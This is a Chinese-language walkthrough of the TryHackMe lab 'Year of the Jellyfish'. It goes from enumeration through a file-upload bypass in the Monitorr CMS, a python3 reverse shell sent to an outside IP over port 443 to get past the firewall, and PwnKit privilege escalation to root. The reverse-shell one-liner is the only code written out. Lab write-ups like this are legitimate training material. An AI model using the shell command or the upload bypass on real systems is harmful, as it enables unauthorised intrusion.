# Year of the Jellyfish

请注意 - 此框使用公共 IP 进行部署。想想这对你应该如何应对这一挑战意味着什么。如果您高速枚举公共 IP 地址，ISP 通常会不满意......

---

## 端口扫描

循例nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/f94026c38a1d4ba7b7c417588218cf37.png)

扫描结果中还有域名，加进hosts

![在这里插入图片描述](https://img-blog.csdnimg.cn/d680c09b182a4dd48fc63e096e7d38cc.png)

## FTP 枚举

尝试anonymous

![在这里插入图片描述](https://img-blog.csdnimg.cn/eaedc2c99d0044eca581f75e1e8ff835.png)

## Web枚举

有三个端口的http 80、443、8000、8096，80会跳转到443

443是一个宠物商店

![在这里插入图片描述](https://img-blog.csdnimg.cn/005c05a6be144ec4a9f7c2e3fdc60520.png)

通过源代码可以找到有关cms的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/b697d16236984456b6d1798f79018dd3.png)

然而通过github得知，这个cms没后台，可能是个兔子洞

访问8000端口

![在这里插入图片描述](https://img-blog.csdnimg.cn/d1512ecc6c674276a1108b4fa358ca6b.png)

当我尝试各种vhost扫描，甚至当我反应过来这是公网ip时，我尝试通过osint收集子域信息，但都无果

最后我忽略了https的证书信息，好吧，我不会在忘记了

![在这里插入图片描述](https://img-blog.csdnimg.cn/71fa1a269e004924b0baa45770047839.png)

将这些子域都添加到hosts

dev跟80端口一样，beta跟8000端口一致

monitorr

![在这里插入图片描述](https://img-blog.csdnimg.cn/1e68d6c3952e43d49b876651d9f5967c.png)

## 任意文件上传 - RCE

在底部暴露了cms项目地址和版本号

![在这里插入图片描述](https://img-blog.csdnimg.cn/e44fedf60c87408db7ccbbe5945a4793.png)

但是使用searchsploit同时发现了rce和身份验证绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/8cbe75e950a241efae30294fb97802ca.png)

然而利用貌似不成功，账户未被成功创建，原因是exp的那个url不存在，可能已经被出题人删了

![在这里插入图片描述](https://img-blog.csdnimg.cn/013e3887e1d34664bb787ead02a89af9.png)

在github上查看页面代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/e96a0c67f8634d05b0d5df6de114941a.png)

还有一个未授权任意文件上传漏洞

upload.php存在缺陷且没有安全检查，只要绕过getimagesize函数即可任意文件上传

![在这里插入图片描述](https://img-blog.csdnimg.cn/0517549c513048eea415e34bd18a228d.png)

由于靶机是公网ip，这里可以利用thm的网络kali

![在这里插入图片描述](https://img-blog.csdnimg.cn/2a4bd2a45a4d4f5088db9efc2da6851f.png)

发现有后缀黑名单

![在这里插入图片描述](https://img-blog.csdnimg.cn/c61b46ce7f7c49d2bc01febbc204b6d6.png)

双重后缀可以绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/32734f79d26d4de9b3fa628222b431f2.png)

## Reverse Shell

试了几种方式反向shell，但都弹不出来，断定开了防火墙，但尝试查看iptables策略却得不到结果

根据thm红队[绕过防火墙](https://tryhackme.com/room/redteamfirewalls)的房间，我们可以尝试80、443这些端口

payload:

	python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("54.195.30.192",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' 

![在这里插入图片描述](https://img-blog.csdnimg.cn/c9e30f21fbc641f59fab9a74d4060de2.png)

getshell

flag1在www-data家目录

![在这里插入图片描述](https://img-blog.csdnimg.cn/b3b6daebbca84d5ab3a9c7dd54bee8d1.png)

## 权限提升 - CVE-2021-4034

看到是ubuntu 18.04 lts

![在这里插入图片描述](https://img-blog.csdnimg.cn/30da33ffdc2147eb8435518c9806ba73.png)

pkexec还有suid

![在这里插入图片描述](https://img-blog.csdnimg.cn/0715c6050d094d0fb31e10e4cfd9c5dc.png)

直接打pwnkit

![在这里插入图片描述](https://img-blog.csdnimg.cn/c3590522f0e540bd84b9a09aafc18c33.png)

getroot
